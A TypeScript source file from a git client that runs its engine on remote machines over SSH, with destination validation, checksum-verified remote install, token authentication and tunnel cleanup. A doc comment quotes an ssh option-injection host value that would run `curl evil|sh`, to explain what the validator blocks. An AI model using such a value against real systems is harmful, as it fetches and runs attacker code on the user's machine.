// Running gitc on another machine, over SSH.
//
// A remote tab is not "git commands sent over ssh". It is a whole gitc engine
// running on the remote host, with its port forwarded back here - the same
// engine, reading the same `.git` directly, just on the other side. Anything
// else would give up the reason reads are fast: a graph load is a hundred-odd
// git invocations, and a hundred SSH round trips is a different application.
//
// One `ssh -L` process per connection does both jobs at once: it holds the
// forward open AND runs the remote engine in the foreground, so the engine's
// lifetime is the tunnel's lifetime - but only because connect() forces a
// pseudo-terminal. Without one the remote engine outlives every disconnect;
// see the note on -tt below. Leaving processes behind on somebody else's
// server is the thing this file most has to get right.
//
// Everything about the connection itself is delegated to the system `ssh`
// binary: aliases, IdentityFile, agent, known_hosts, ProxyJump. gitc reads
// ~/.ssh/config only to OFFER hosts (see sshConfig.ts); it never resolves one.

import { spawn } from "node:child_process";
import { createHash } from "node:crypto";
import { mkdtempSync, readFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { createServer, request } from "node:http";

import { VERSION } from "../generated/version.ts";
import { at } from "./safe.ts";
import { DETECT_COMMAND, classify, type RemoteKind } from "./remotePlatform.ts";

/** The port the remote engine binds, on the remote's loopback only. */
const REMOTE_PORT = 7893;
/** How long to wait for the remote engine to answer through the tunnel. */
const CONNECT_TIMEOUT_MS = 30000;
/** Where the remote's binary goes when its platform did not name a place. */
const DEFAULT_BIN = "~/.local/bin/gitc";

/**
 * Refuses an ssh destination that ssh would read as an option.
 *
 * The destination goes into ssh's argv, and argv has no quoting to hide
 * behind: a host of `-oProxyCommand=sh -c "curl evil|sh"` is parsed as an
 * option and runs that command. It reaches here from POST /api/open and
 * GET /api/ls?host=, which any page in the user's browser can call - the
 * engine listens on loopback and checks no Origin - so this is not a
 * well-formedness check, it is the boundary.
 *
 * Not validated against ~/.ssh/config: that file is a convenience for
 * offering hosts, not the set of destinations that are allowed, and
 * user@host typed by hand has to keep working. What matters is that ssh
 * cannot mistake it for a flag, and that it is a plausible destination.
 */
export function isSafeDestination(host: string): boolean {
  if (host.length === 0 || host.length > 255) return false;
  // A leading dash is the whole attack.
  if (host.startsWith("-")) return false;
  // user@host, host, an alias, IPv6 in brackets. No spaces, no quotes, no
  // shell metacharacters - none of which belong in any of those.
  return /^[A-Za-z0-9._@:\[\]-]+$/.test(host);
}

export interface Ran {
  code: number;
  out: string;
  err: string;
}

/**
 * Runs one command on the remote and collects its output.
 *
 * BatchMode stops ssh blocking forever on a passphrase or password prompt
 * that nobody can answer: gitc has no terminal to type into, so a host that
 * cannot authenticate from the agent has to fail rather than hang. That is
 * the whole of the "config aliases and agent" scope - anything needing a
 * prompt is a clear error, not a wait.
 */
export function sshRun(host: string, command: string): Promise<Ran> {
  return new Promise((resolve) => {
    if (!isSafeDestination(host)) {
      resolve({ code: 127, out: "", err: "refusing an unsafe ssh destination" });
      return;
    }
    const child = spawn(
      "ssh",
      ["-o", "BatchMode=yes", "-o", "ConnectTimeout=15", host, command],
      {
        stdio: ["ignore", "pipe", "pipe"],
        // Same reason as git.ts: a GUI-subsystem parent has no console to
        // lend, so without this Windows gives every ssh its own. scriptc
        // never reads windowsHide; detached lowers to DETACHED_PROCESS.
        detached: true,
      },
    );

    // See localRun: these are not narrowed by the compiler, and a failed
    // spawn has neither.
    const stdout = child.stdout;
    const stderr = child.stderr;
    if (stdout === null || stderr === null) {
      resolve({ code: 127, out: "", err: "could not start ssh" });
      return;
    }

    const out: Uint8Array[] = [];
    const err: Uint8Array[] = [];
    let code = 0;
    let exited = false;
    let open = 2;

    const settle = () => {
      if (!exited || open > 0) return;
      resolve({
        code,
        out: Buffer.concat(out).toString("utf8"),
        err: Buffer.concat(err).toString("utf8"),
      });
    };

    stdout.on("data", (c: Buffer) => out.push(c));
    stderr.on("data", (c: Buffer) => err.push(c));
    stdout.on("end", () => {
      open--;
      settle();
    });
    stderr.on("end", () => {
      open--;
      settle();
    });
    child.on("exit", (c: number | null) => {
      code = c === null ? 1 : c;
      exited = true;
      settle();
    });
    child.on("error", () => {
      code = 127;
      exited = true;
      open = 0;
      settle();
    });
  });
}

/** What the far end is, and what it would need. */
export async function detectRemote(host: string): Promise<RemoteKind> {
  const r = await sshRun(host, DETECT_COMMAND);
  return classify(r.out + "\n" + r.err);
}

/** The version of gitc on the remote, or null if there is not one. */
export async function remoteVersion(host: string, bin: string): Promise<string | null> {
  const r = await sshRun(host, bin + " --version 2>/dev/null || true");
  const line = r.out.trim();
  if (line.length === 0) return null;
  // "gitc 0.4.4"
  const parts = line.split(/\s+/);
  const v = at(parts, 1);
  return v === undefined ? null : v;
}

/**
 * The shell the remote runs to fetch its own copy.
 *
 * Written as one script rather than a conversation of round trips, and it
 * verifies the checksum before the binary is ever made executable - this is a
 * download running on somebody's server, and "it came from the right URL" is
 * not the same as "it is what the release published".
 *
 * Exit 2 means specifically "could not get it from the internet", which is the
 * caller's signal to push one from here instead.
 */
function downloadScript(version: string, kind: RemoteKind): string {
  const base = "https://github.com/Adrriii/gitc/releases/download/v" + version;
  // Both are non-null by the time this runs - ensureRemote refuses a platform
  // that has neither - but the types do not know that.
  const asset = kind.asset === null ? "gitc" : kind.asset;
  const bin = kind.binPath === null ? DEFAULT_BIN : kind.binPath;
  return [
    "set -e",
    "mkdir -p $(dirname " + bin + ")",
    "tmp=$(mktemp -d)",
    'trap "rm -rf $tmp" EXIT',
    "cd $tmp",
    "curl -fsSL -m 120 -o dl " + base + "/" + asset + " || exit 2",
    "curl -fsSL -m 60 -o SUMS " + base + "/SHA256SUMS || exit 2",
    // sha256sum writes "*name" in binary mode, so the star is optional here.
    "want=$(grep -E '(^| )[*]?" + asset + "$' SUMS | awk '{print $1}')",
    "got=$(sha256sum dl | awk '{print $1}')",
    '[ -n "$want" ] && [ "$want" = "$got" ] || exit 3',
    "install -m 755 dl " + bin,
  ].join("\n");
}

export type InstallOutcome =
  | { ok: true; how: "already" | "downloaded" | "pushed" }
  /**
   * `needsApproval` separates "gitc may not install here" from every other
   * failure, so the window can offer the question instead of only the error.
   */
  | { ok: false; error: string; needsApproval?: boolean };

/**
 * What connecting to a host would do about the binary over there.
 *
 * Read-only, deliberately: it runs the same two probes ensureRemote starts
 * with - what the machine is, and what gitc it already has - and stops before
 * the part that writes. That is what makes it usable as the question asked
 * BEFORE anything installs, which is the whole point of it existing
 * separately.
 */
export interface RemotePlan {
  host: string;
  /**
   * "ready"   the right gitc is already there, nothing to do
   * "install" no gitc on that machine at all
   * "replace" a gitc of another version, which cannot serve a tab
   * "refused" the machine cannot be used, whatever anybody agrees to
   */
  action: "ready" | "install" | "replace" | "refused";
  /** The version already over there, null when there is none. */
  have: string | null;
  /** The version it would end up with, which is this gitc's. */
  want: string;
  /** Where the binary goes, as the remote's own shell would write it. */
  path: string;
  /** Why the machine cannot be used, null when it can. */
  refusal: string | null;
}

export async function planRemote(host: string): Promise<RemotePlan> {
  const want = VERSION;
  if (!isSafeDestination(host)) {
    return {
      host,
      action: "refused",
      have: null,
      want,
      path: DEFAULT_BIN,
      refusal: '"' + host + '" is not a usable ssh destination',
    };
  }

  const kind = await detectRemote(host);
  const path = kind.binPath === null ? DEFAULT_BIN : kind.binPath;
  if (kind.refusal !== null) {
    return { host, action: "refused", have: null, want, path, refusal: kind.refusal };
  }

  const have = await remoteVersion(host, path);
  const action = have === want ? "ready" : have === null ? "install" : "replace";
  return { host, action, have, want, path, refusal: null };
}

/**
 * Makes sure the remote has a gitc matching this one.
 *
 * The order is the one asked for: let the remote fetch its own copy, and only
 * if it cannot - a box with no route to the internet, which is most build
 * servers worth having - push one from here.
 *
 * What gets pushed follows the REMOTE's platform, never this machine's. The
 * connection is not a direction: a Linux workstation reaching a Windows agent
 * is the same feature as the reverse, and the first version of this got it
 * wrong by assuming the pair. Whatever the remote needs is fetched here first,
 * because this side is the one with the internet, and sent on with scp - which
 * needs no stdin, and piping into a child's stdin is a compile fence.
 *
 * Versions must match exactly. The UI and the engine are one program split
 * across a socket, and a mismatch is a field the window reads that the engine
 * never sends.
 *
 * `approved` is the answer to the question in approvals.ts, and it gates every
 * path that writes to the remote - the download it runs there as much as the
 * binary pushed from here. The decision is passed in rather than read here so
 * this file stays free of the config directory, and so a caller cannot install
 * by forgetting to ask.
 */
export async function ensureRemote(host: string, approved: boolean): Promise<InstallOutcome> {
  const kind = await detectRemote(host);
  if (kind.refusal !== null) return { ok: false, error: kind.refusal };
  const bin = kind.binPath === null ? DEFAULT_BIN : kind.binPath;

  const have = await remoteVersion(host, bin);
  if (have === VERSION) return { ok: true, how: "already" };

  // Nothing below this line is reversible from here: it puts a file on
  // somebody else's machine.
  if (!approved) {
    const what =
      have === null
        ? "gitc is not installed on " + host
        : host + " has gitc " + have + ", and this one is " + VERSION;
    return {
      ok: false,
      needsApproval: true,
      error: what + " - open it from the Repositories screen to let gitc install itself there",
    };
  }

  const dl = await sshRun(host, downloadScript(VERSION, kind));
  if (dl.code === 0) {
    const now = await remoteVersion(host, bin);
    if (now === VERSION) return { ok: true, how: "downloaded" };
    return { ok: false, error: "the remote installed " + String(now) + ", expected " + VERSION };
  }
  if (dl.code === 3) {
    return { ok: false, error: "the binary the remote downloaded did not match its checksum" };
  }
  // Anything else - including exit 2 - means the remote could not fetch it,
  // which is the ordinary case for a build box with no route out. Send one.
  return await pushRemote(host, kind, bin);
}

/** Runs a local program the same way sshRun runs a remote one. */
function localRun(cmd: string, args: string[]): Promise<Ran> {
  return new Promise((resolve) => {
    const child = spawn(cmd, args, { stdio: ["ignore", "pipe", "pipe"], detached: true });
    // Guarded rather than assumed: scriptc does not narrow these off the stdio
    // tuple, and a spawn that failed outright has neither stream.
    const stdout = child.stdout;
    const stderr = child.stderr;
    if (stdout === null || stderr === null) {
      resolve({ code: 127, out: "", err: "could not start " + cmd });
      return;
    }
    const out: Uint8Array[] = [];
    const err: Uint8Array[] = [];
    let code = 0;
    let exited = false;
    let open = 2;
    const settle = () => {
      if (!exited || open > 0) return;
      resolve({
        code,
        out: Buffer.concat(out).toString("utf8"),
        err: Buffer.concat(err).toString("utf8"),
      });
    };
    stdout.on("data", (c: Buffer) => out.push(c));
    stderr.on("data", (c: Buffer) => err.push(c));
    stdout.on("end", () => {
      open--;
      settle();
    });
    stderr.on("end", () => {
      open--;
      settle();
    });
    child.on("exit", (c: number | null) => {
      code = c === null ? 1 : c;
      exited = true;
      settle();
    });
    child.on("error", () => {
      code = 127;
      exited = true;
      open = 0;
      settle();
    });
  });
}

/**
 * Sends a Linux binary from here, for a remote that cannot fetch its own.
 *
 * A Windows install has no Linux binary to send, so it is fetched here first -
 * this machine has the internet the remote lacks, which is the entire point of
 * the fallback - checked against the published checksum, and copied over with
 * scp. scp rather than `ssh host "cat > file"` because piping into a child's
 * stdin is a compile fence in scriptc.
 *
 * It lands beside the real name and is moved into place afterwards, so a
 * transfer that dies halfway cannot leave a half-written binary that the next
 * connection would happily try to run.
 */
export async function pushRemote(
  host: string,
  kind: RemoteKind,
  bin: string,
): Promise<InstallOutcome> {
  // scp's destination is argv too, with the same option-injection shape.
  if (!isSafeDestination(host)) {
    return { ok: false, error: "refusing an unsafe ssh destination" };
  }
  if (kind.asset === null) {
    return { ok: false, error: "no gitc binary is published for the remote's platform" };
  }
  const base = "https://github.com/Adrriii/gitc/releases/download/v" + VERSION;
  const dir = mkdtempSync(join(tmpdir(), "gitc-remote-"));
  const binary = join(dir, kind.asset);
  const sums = join(dir, "SHA256SUMS");

  try {
    const a = await localRun("curl", ["-fsSL", "-m", "120", "-o", binary, base + "/" + kind.asset]);
    if (a.code !== 0) {
      return {
        ok: false,
        error: "the remote could not download gitc, and neither could this machine",
      };
    }
    const b = await localRun("curl", ["-fsSL", "-m", "60", "-o", sums, base + "/SHA256SUMS"]);
    if (b.code !== 0) return { ok: false, error: "could not fetch the checksums for v" + VERSION };

    const want = expectedSum(readFileSync(sums, "utf8"), kind.asset);
    if (want === null) {
      return { ok: false, error: "the published checksums did not list " + kind.asset };
    }
    const got = createHash("sha256").update(readFileSync(binary)).digest("hex");
    if (want !== got) {
      return { ok: false, error: "the gitc downloaded here did not match its published checksum" };
    }

    // scp writes it beside the real name; the move is what makes it live, so a
    // transfer that dies halfway cannot leave a half-written binary behind.
    const incoming = bin + ".incoming";
    // scp resolves a relative path against the remote's home directory, which
    // is what the leading "~/" in binPath means anyway. Stripped by hand:
    // String.replace runs in an embedded dynamic engine this build leaves out
    // (SC2012).
    const relative = incoming.startsWith("~/") ? incoming.substring(2) : incoming;
    const scp = await localRun("scp", [
      "-o", "BatchMode=yes",
      "-o", "ConnectTimeout=15",
      binary,
      host + ":" + relative,
    ]);
    if (scp.code !== 0) {
      return { ok: false, error: "could not copy gitc to " + host + ": " + scp.err.trim() };
    }

    const place = await sshRun(host, "chmod 755 " + incoming + " && mv " + incoming + " " + bin);
    if (place.code !== 0) {
      return { ok: false, error: "could not install the copied gitc: " + place.err.trim() };
    }

    const now = await remoteVersion(host, bin);
    if (now !== VERSION) {
      return {
        ok: false,
        error: "the copied gitc reports " + String(now) + ", expected " + VERSION,
      };
    }
    return { ok: true, how: "pushed" };
  } finally {
    try {
      rmSync(dir, { recursive: true, force: true });
    } catch {
      // A leftover temp directory is not worth reporting.
    }
  }
}

/** The line for one asset out of a SHA256SUMS file, which lists several. */
function expectedSum(text: string, asset: string): string | null {
  for (const line of text.split("\n")) {
    const parts = line.trim().split(/\s+/);
    const sum = at(parts, 0);
    const name = at(parts, 1);
    if (sum === undefined || name === undefined) continue;
    // "gitc" and "*gitc" - sha256sum writes the star for binary mode.
    if (name === asset || name === "*" + asset) return sum;
  }
  return null;
}

export interface Connection {
  host: string;
  /** Loopback port here that reaches the remote engine. */
  port: number;
  /**
   * When this connection was last used, for deciding what has gone idle.
   *
   * On the connection rather than in a map beside it: a timestamp keyed by
   * host outlives the connection it described, so a reconnect inherited the
   * age of the tunnel it replaced and was swept moments after being made.
   */
  usedAt: number;
  /**
   * Requests currently in flight on this tunnel.
   *
   * `usedAt` says "recently finished", which is a different question. A push
   * slower than the hold is idle by that measure for its whole duration, and
   * the sweeper would close the tunnel - killing the remote engine and the
   * git under it - while the request it belongs to is still running.
   */
  inFlight: number;
  /**
   * The secret the engine at the far end demands on every request.
   *
   * A remote engine listens on the remote machine's loopback with nothing in
   * front of it, and every other account on that machine can reach loopback.
   * A build box or a jump host - which is what this feature is for - usually
   * has several. Without this, any of them could read the filesystem through
   * /api/ls and /api/diff and run /api/op, /api/discard and /api/commit as
   * the connecting user, for as long as a tab was open, on a port fixed at
   * 7893 so there was nothing to discover.
   *
   * The engine invents it, and prints it on its own stdout - which travels
   * back inside the ssh channel and nowhere else. Deliberately NOT the
   * command line: `ps` is world-readable on exactly the hosts where this
   * matters, so argv is the one channel that would hand the secret to the
   * accounts it is meant to keep out.
   */
  token: string;
  /** Ends the tunnel and, with it, the remote engine. */
  close: () => void;
}

/**
 * The line a --serve engine prints to hand its token back up the tunnel.
 *
 * A distinctive prefix rather than a position: the remote prints other things
 * first, and with -tt everything it says arrives on one stream.
 */
export const TOKEN_LINE = "gitc-token:";

/**
 * Reads the token out of whatever the remote has said so far.
 *
 * Returns null until the line has arrived in full - a pty delivers it in
 * whatever chunks it likes, so a prefix with no newline yet is not an answer.
 */
export function readToken(said: string): string | null {
  const at = said.indexOf(TOKEN_LINE);
  if (at === -1) return null;
  const from = at + TOKEN_LINE.length;
  // A pty ends lines with CR LF, and the CR is part of neither.
  let end = said.length;
  for (let i = from; i < said.length; i++) {
    const c = said.charAt(i);
    if (c === String.fromCharCode(10) || c === String.fromCharCode(13)) {
      end = i;
      break;
    }
  }
  if (end === said.length) return null;
  const token = said.substring(from, end).trim();
  return token.length > 0 ? token : null;
}

/**
 * What the remote said, without the token line.
 *
 * The same text is used for error messages, and a secret in a message the UI
 * shows - and that somebody pastes into a bug report - is a secret gone.
 */
export function withoutToken(said: string): string {
  const at = said.indexOf(TOKEN_LINE);
  if (at === -1) return said;
  let end = said.length;
  for (let i = at; i < said.length; i++) {
    if (said.charAt(i) === String.fromCharCode(10)) {
      end = i + 1;
      break;
    }
  }
  return said.substring(0, at) + said.substring(end);
}

/** A free loopback port, found by letting the OS pick one and handing it back. */
function freePort(): Promise<number> {
  return new Promise((resolve, reject) => {
    const probe = createServer(() => undefined);
    probe.on("error", () => reject(new Error("no free port")));
    // Composed read of address().port: the only form scriptc lowers.
    probe.listen(0, () => {
      const port = probe.address().port;
      probe.close(() => resolve(port));
    });
  });
}

/**
 * One request to the engine at the far end of a tunnel.
 *
 * Used for the handshake that opens a repository there. Ordinary traffic does
 * not come through here - it is proxied straight through from the window, so
 * the bytes are never parsed twice.
 */
export function tunnelRequest(
  port: number,
  path: string,
  method: string,
  body: string | null,
  /** The far engine's token - see Connection.token. */
  token: string,
): Promise<{ status: number; text: string }> {
  return new Promise((resolve) => {
    const headers: Record<string, string> = {};
    if (token.length > 0) headers["x-gitc-token"] = token;
    if (body !== null) {
      headers["content-type"] = "application/json";
      headers["content-length"] = String(Buffer.byteLength(body));
    }
    const req = request(
      {
        hostname: "127.0.0.1",
        port: port,
        path: path,
        method: method,
        headers: headers,
        timeout: 30000,
      },
      (res) => {
        let text = "";
        res.on("data", (chunk: Buffer) => {
          text += chunk.toString("utf8");
        });
        res.on("end", () => resolve({ status: res.statusCode ?? 0, text }));
      },
    );
    req.on("error", () => resolve({ status: 0, text: "" }));
    req.on("timeout", () => resolve({ status: 0, text: "" }));
    if (body !== null) req.write(body);
    req.end();
  });
}

/**
 * Is the tunnel carrying OUR engine yet?
 *
 * Two questions, in this order, and the order is the point.
 *
 * First: does whatever holds this port refuse a request with no token? An
 * earlier version asked only "does it answer 200 with the token", which any
 * HTTP server on that port satisfies - it does not have to demand the token,
 * merely tolerate an unknown header. So a process already sitting on the
 * remote's 7893, which on a shared box is the premise of this whole feature,
 * answered the ping and was then handed the token and every request after it.
 *
 * Asking without the token first costs nothing and is asked before anything
 * is revealed: a stranger that answers 200 to an unauthenticated ping is not
 * a gitc engine of ours, and we stop there having told it nothing.
 *
 * Second: does it accept OUR token? Only an engine that printed it can.
 */
function answering(port: number, token: string): Promise<boolean> {
  return new Promise((resolve) => {
    void ping(port, null).then((unauthenticated) => {
      // Not 403 means it does not demand a token. Either something else holds
      // the port, or it is a gitc too old to have this - and neither is a
      // thing to hand a secret to.
      if (unauthenticated !== 403) {
        resolve(false);
        return;
      }
      void ping(port, token).then((authenticated) => resolve(authenticated === 200));
    });
  });
}

/** One /api/ping, answering with the status code or 0 if nothing replied. */
function ping(port: number, token: string | null): Promise<number> {
  return new Promise((resolve) => {
    const headers: Record<string, string> = {};
    if (token !== null) headers["x-gitc-token"] = token;
    const req = request(
      {
        // Spelled out rather than shorthand: the compiler asks for it here.
        hostname: "127.0.0.1",
        port: port,
        path: "/api/ping",
        method: "GET",
        headers: headers,
        timeout: 2000,
      },
      (res) => resolve(res.statusCode ?? 0),
    );
    req.on("error", () => resolve(0));
    req.on("timeout", () => resolve(0));
    req.end();
  });
}

/**
 * Opens a tunnel and starts the remote engine inside it.
 *
 * ExitOnForwardFailure matters: without it ssh reports a taken local port on
 * stderr and carries on regardless, so the connection would look established
 * while pointing at whatever else holds that port.
 */
export async function connect(
  host: string,
  bin: string,
  /** Called if the tunnel ends by itself, so the caller can stop offering it. */
  onEnded: () => void,
): Promise<Connection> {
  if (!isSafeDestination(host)) throw new Error("refusing an unsafe ssh destination");
  const port = await freePort();
  // The bind address is written out, not left to GatewayPorts.
  //
  // Without it ssh binds the local end "in accordance with the GatewayPorts
  // setting" - a setting gitc neither controls nor reads, which somebody may
  // have turned on years ago under a Host * block for a different tool. With
  // it on, this listener is on every interface of this machine, and what
  // answers on it is an engine with no authentication of any kind: the remote
  // filesystem through /api/ls, every repository that user can read, and
  // /api/op, /api/discard and /api/commit running as them.
  //
  // Same argument as the three -o flags below, which already decline to trust
  // ambient config for BatchMode, ConnectTimeout and ExitOnForwardFailure.
  const forward = "127.0.0.1:" + String(port) + ":127.0.0.1:" + String(REMOTE_PORT);
  // The engine over there listens on the remote's loopback, which is the
  // right bind and is NOT on its own a trust boundary on the machines this
  // feature is for: a build box or a jump host usually has other accounts,
  // and any of them can reach 127.0.0.1:7893 on a port fixed enough that
  // there is nothing to discover. What stops them is the token that engine
  // demands - see Connection.token, and the announcement in main.ts.
  //
  // The token travels on the remote's stdout, which arrives here inside the
  // ssh channel. Not on this command line: `ps` is world-readable on exactly
  // the hosts where this matters, so argv is the one channel that would hand
  // the secret to the accounts it is meant to keep out.
  //
  // --port= with the equals sign: the space form is ignored, and the engine
  // would then find the default port, hand off to whatever holds it and exit.
  // --serve, not --no-window: the same behaviour, but the production spelling.
  // --no-window belongs to the dev loop, and a remote engine steered by a dev
  // flag is a change made for `npm run dev` reaching somebody's server.
  const remote = "exec " + bin + " --serve --port=" + String(REMOTE_PORT);

  const child = spawn(
    "ssh",
    [
      "-o", "BatchMode=yes",
      "-o", "ConnectTimeout=15",
      "-o", "ExitOnForwardFailure=yes",
      // -tt forces a pseudo-terminal even though gitc has no terminal of its
      // own to pass through. Without it, killing this ssh leaves the engine
      // running on the remote for ever: ssh closes the channel, but the
      // command it started is not in a session that receives SIGHUP, so
      // nothing tells it to stop. Measured - a killed tunnel left
      // `gitc --no-window --port=7893` alive on the host indefinitely, and
      // there is no worse habit for a tool that connects to other people's
      // servers. With a pty the disconnect hangs up the session and the
      // engine goes with it.
      "-tt",
      "-L", forward,
      host,
      remote,
    ],
    { stdio: ["ignore", "pipe", "pipe"], detached: true },
  );

  // Kept for the failure message: when the engine never answers, ssh's own
  // complaint is the only thing that says why.
  let stderr = "";
  const errStream = child.stderr;
  if (errStream !== null) {
    errStream.on("data", (c: Buffer) => {
      stderr += c.toString("utf8");
    });
  }

  // The remote engine's own words. With -tt everything it prints comes back
  // on this stream, and it is the only place a reason like "that port is
  // taken" can appear - ssh only ever reports that the connection closed,
  // never why the thing at the other end stopped.
  //
  // Read as well as kept: an unread pipe eventually fills and blocks the
  // child, which for a tunnel that is meant to live for hours is a hang
  // waiting to happen.
  let remoteSaid = "";
  /**
   * The token, taken off the stream as it arrives rather than out of the
   * capped buffer above.
   *
   * The 4000-character cap was harmless when this stream only ever became an
   * error message. It is not harmless now that the token arrives on it: -tt
   * allocates a pty, sshd prints its banner and MOTD into one, and a host
   * whose banner runs past 4000 characters would push the token line out of
   * everything readToken can see - making that host permanently
   * unconnectable, and reporting it as a timeout rather than as the cause.
   *
   * So the scan runs over a sliding tail of its own, which stops growing the
   * moment the token is found. A tail is enough because the line is short:
   * whatever chunk boundary it is delivered across, the whole of it is inside
   * the window by the time it is complete.
   */
  let tokenTail = "";
  let token: string | null = null;
  const TAIL = 4096;

  const outStream = child.stdout;
  if (outStream !== null) {
    outStream.on("data", (c: Buffer) => {
      const text = c.toString("utf8");
      if (remoteSaid.length < 4000) remoteSaid += text;
      if (token === null) {
        // Scanned BEFORE the tail is trimmed, so a chunk that carries the
        // whole line and then a great deal more cannot lose it between the
        // two steps. Trimming first made that ordering matter; this way it
        // does not.
        tokenTail += text;
        token = readToken(tokenTail);
        if (token !== null) tokenTail = "";
        else if (tokenTail.length > TAIL) {
          tokenTail = tokenTail.substring(tokenTail.length - TAIL);
        }
      }
    });
  }

  // Distinguishes the two ways a tunnel ends. "We closed it" is ordinary -
  // a swept idle host, a closed tab, gitc exiting. Anything else is the
  // tunnel failing underneath us, and only that needs explaining.
  let closedHere = false;
  /** Set the moment ssh exits, so the readiness loop stops waiting on it. */
  let ended = false;
  const close = () => {
    closedHere = true;
    try {
      child.kill();
    } catch {
      // Already gone, which is the state we wanted.
    }
  };

  child.on("exit", (code: number | null) => {
    ended = true;
    if (closedHere) return;
    const why = stderr.trim();
    const said = withoutToken(remoteSaid).trim();
    console.log(
      "[tunnel] " + host + " ended on its own, code " + String(code) +
        (why.length > 0 ? " - ssh: " + why : "") +
        (said.length > 0 ? " - remote said: " + said : ""),
    );
    // Whoever is holding this has to stop holding it. A tunnel that ended by
    // itself is still in the connection map otherwise, which means the LED
    // stays green for a host that is gone and the next request proxies into a
    // dead socket before anything reconnects.
    onEnded();
  });

  /**
   * Something is on that port and it does not want a token.
   *
   * Which is not a mystery to time out over: an engine of ours always refuses
   * an unauthenticated ping, before and after it has said anything, so a 200
   * is proof that whatever answered is not one. In practice it is a gitc from
   * before the token existed, still running from an earlier session - the
   * binary gets brought up to date by ensureRemote, but a process already
   * holding 7893 does not, and the new one exits on EADDRINUSE without ever
   * printing a token.
   *
   * Worth telling apart because the alternative is the worst kind of error:
   * thirty seconds of "Opening...", then failureReason handing back the old
   * engine's own cheerful stdout - "gitc serving http://127.0.0.1:7893/" -
   * as the explanation for a failure.
   */
  let unauthenticated = false;

  const started = Date.now();
  while (Date.now() - started < CONNECT_TIMEOUT_MS) {
    // The token first, then readiness. There is nothing to probe with until
    // the engine has announced itself, and it only announces once it has the
    // port - so this arriving is also the first evidence the far side is up.
    if (token !== null) {
      if (await answering(port, token)) {
        return { host, port, usedAt: Date.now(), inFlight: 0, token, close };
      }
    } else if ((await ping(port, null)) === 200) {
      unauthenticated = true;
      break;
    }
    // ssh has already gone: a refused key under BatchMode, a forward that
    // could not bind, an engine that exited on a taken port. Waiting out the
    // remaining thirty seconds to say "no answer" tells the user nothing and
    // leaves them watching "Opening..." for half a minute.
    if (ended) break;
    await new Promise((r) => setTimeout(r, 300));
  }

  close();

  if (unauthenticated) {
    // Rare, and defensive rather than load-bearing.
    //
    // ensureRemote has already brought the remote's BINARY to this exact
    // version before connect() runs, and every release carries a distinct
    // number, so an out of date gitc is not normally what is on that port.
    // What can still be there is a process: an old engine holding 7893 from
    // an earlier session, which an upgraded binary does not displace. That
    // one usually reports itself, though - the new engine exits on
    // EADDRINUSE, ssh goes with it, and `ended` breaks the loop below before
    // this ping resolves, so the remote's own "port 7893 is already in use"
    // is what comes back.
    //
    // What is left is whatever else might answer on that port, which is the
    // reason to fail fast here rather than wait out the full timeout.
    //
    // Worded as what was observed rather than as what it probably is. All
    // this establishes is that something answered without demanding a token;
    // an unrelated program on that port produces the same 200 and would
    // otherwise be told it is an out of date gitc. That is not a hypothetical
    // - a five-line Python server standing in for exactly this case is how
    // the token-disclosure check was tested.
    throw new Error(
      "something on " + host + " port " + String(REMOTE_PORT) +
        " answers without demanding a connection token - an older gitc, or" +
        " another program holding that port. If it is a gitc left over from" +
        " an earlier session, stop it there; if it is an older gitc, update" +
        " gitc on " + host + "; otherwise free that port.",
    );
  }

  // withoutToken: this text reaches the UI, and a secret in an error message
  // is a secret in a screenshot.
  throw new Error(failureReason(stderr, withoutToken(remoteSaid)));
}

/**
 * The best available explanation for a tunnel that never came up.
 *
 * The remote's own words come first. With -tt its stderr is merged into the
 * pty and arrives on stdout, so ssh's stderr is usually empty or says only
 * that the connection closed - while the engine over there may have said
 * exactly why it stopped.
 */
function failureReason(sshSaid: string, remoteSaid: string): string {
  const remote = remoteSaid.trim();
  if (remote.length > 0) return remote;
  const ssh = sshSaid.trim();
  if (ssh.length > 0) return ssh;
  return "the remote engine did not answer within 30 seconds";
}
